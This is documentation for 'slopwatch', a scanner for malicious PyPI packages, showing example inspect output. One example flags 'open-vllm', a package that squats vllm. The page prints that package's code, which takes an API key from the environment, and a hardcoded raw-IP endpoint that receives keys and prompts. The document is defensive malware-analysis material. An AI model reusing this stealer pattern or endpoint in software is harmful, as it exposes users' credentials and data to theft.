# 🔎 Example `slopwatch inspect` output

Real runs of `slopwatch inspect <package>` against live PyPI packages. Verdict
meanings are in the [README](../README.md#-what-slopwatch-is--what-it-isnt); the
finding codes are catalogued in [FINDINGS.md](FINDINGS.md).

> Numbers below (downloads, age) drift over time, and a flagged package may be
> pulled from PyPI after publication — re-run the command to see current state.

---

## ✅ Benign — an established community library

```console
$ slopwatch inspect requests
Fetching metadata for requests on PYPI...
Downloading release payload and running AST + YARA analysis...

Package:    requests  (pypi)  v2.34.2
Author:     Unknown
Homepage:   not declared
Published:  5684 day(s) ago  · 163 release(s)
Downloads:  1,497,444,432/month · 268,877,908/week  (high adoption)
Codebase:   4,740 lines · 212.4 KB · 20 files  (LARGE_CODEBASE)
Provenance: none (unsigned release)
Registry:   https://pypi.org/project/requests/

Findings: 2 flagged location(s) across 2 file(s)
  LOW       2  SOURCE_CODE_ENV_VARS_ACCESS

╭──────────────────────────────────────────────────────────────────────────╮
│ Heuristic Verdict: BENIGN_COMMUNITY (Threat Score: 0/100)                 │
│ Static AST + YARA assessment. Heuristics may be imperfect; always        │
│ inspect source code.                                                     │
╰──────────────────────────────────────────────────────────────────────────╯
```

Two `SOURCE_CODE_ENV_VARS_ACCESS` hits (reading `os.environ` for proxy
settings) are `LOW` confidence — ubiquitous and uninformative on their own.
Fifteen years of history and ~1.5B downloads/month clear the verdict to
`BENIGN_COMMUNITY`. Exit code `0`.

---

## 🚨 Malicious — an API-key interception proxy squatting `vllm`

```console
$ slopwatch inspect open-vllm --details
Fetching metadata for open-vllm on PYPI...
Downloading release payload and running AST + YARA analysis...

Package:    open-vllm  (pypi)  v1.0.2
Author:     Unknown
Homepage:   not declared
Published:  81 day(s) ago  · 1 release(s)
Downloads:  13/month · 2/week  (negligible)
Codebase:   311 lines · 16.7 KB · 7 files  (MODERATE_CODEBASE)
Provenance: none (unsigned release)
Registry:   https://pypi.org/project/open-vllm/
Naming:     brand-anchored on VLLM  · fits template python-vllm-open

Findings: 4 flagged location(s) across 1 file(s)
  HIGH      1  SOURCE_CODE_CONFIRMED_STEALER
  LOW       2  SOURCE_CODE_ENV_VARS_ACCESS
  LOW       1  EXFILTRATION_DESTINATION_DETECTED

🚨 Every flagged location:
  • EXFILTRATION_DESTINATION_DETECTED: 'Raw Public IP Endpoint' found in
    open_vllm-1.0.2/src/vllm_resilience_sdk/clients.py:64
  • SOURCE_CODE_ENV_VARS_ACCESS: 'Environment Variable Access (process.env / os.environ)'
    found in open_vllm-1.0.2/src/vllm_resilience_sdk/clients.py:52
  • SOURCE_CODE_ENV_VARS_ACCESS: 'Sensitive Token Harvesting' found in
    open_vllm-1.0.2/src/vllm_resilience_sdk/clients.py:53
  • SOURCE_CODE_CONFIRMED_STEALER: potential exfiltration endpoint combined with
    credential/environment harvesting in open_vllm-1.0.2/src/vllm_resilience_sdk/clients.py

Line Breakdown:
  • clients.py:64 -> Raw Public IP Endpoint (213.196.166.17)
  • clients.py:52 -> Environment Variable Access (process.env / os.environ)
  • clients.py:53 -> Sensitive Token Harvesting
  • clients.py    -> suspected information stealer (exfiltration endpoint + secret
                     access within 400 chars)

╭──────────────────────────────────────────────────────────────────────────╮
│ Heuristic Verdict: MALICIOUS (Threat Score: 100/100)                      │
│ Static AST + YARA assessment. Heuristics may be imperfect; always        │
│ inspect source code.                                                     │
╰──────────────────────────────────────────────────────────────────────────╯
```

Exit code `1`. What the flags mean, in the package's own `clients.py`:

```python
env_url = env_url or os.environ.get("LIVE_GPU_ENDPOINT_URL")
env_key = env_key or os.environ.get("api_key")
if env_url and env_key:
    headers = {"Authorization": f"Bearer {env_key}", "Content-Type": "application/json"}
    return env_url.strip(), headers          # ← your key + every prompt streamed here
```

with a hardcoded fallback endpoint baked into the error path:

```
LIVE_GPU_ENDPOINT_URL='http://213.196.166.17:61496/v1/chat/completions'
```

The package name squats [`vllm`](https://pypi.org/project/vllm/) (SlopWatch's
`Naming:` line spells out the `{framework}-{entity}-{capability}` template it
fits), it has no author, no repository, one release, ~13 downloads/month, and
LLM-generated filler code. Install it expecting vLLM, point it at your workload,
and your API key and prompts flow to a bare VPS IP. The
`SOURCE_CODE_CONFIRMED_STEALER` composite fires because a raw-IP exfiltration
endpoint and credential/env reads sit within 400 characters of each other.

---

## Regression corpus of confirmed malware

Classic install-time malware is usually removed from PyPI within days, so it
can't be `inspect`ed live. SlopWatch locks in recall against a corpus of
**real, third-party-confirmed** malicious packages (the
[DataDog malicious-software-packages dataset](https://github.com/DataDog/malicious-software-packages-dataset),
Apache-2.0) — fetched and analyzed in-memory at test time, never vendored:

```bash
pytest -m corpus            # tests/test_golden_malware_corpus.py
```

Each entry there (`bloxflipsearch`, `axelo`, `a1rn`, `automsg`, …) is a package
a security team manually confirmed as malicious; the test asserts SlopWatch
still returns `MALICIOUS` for it.
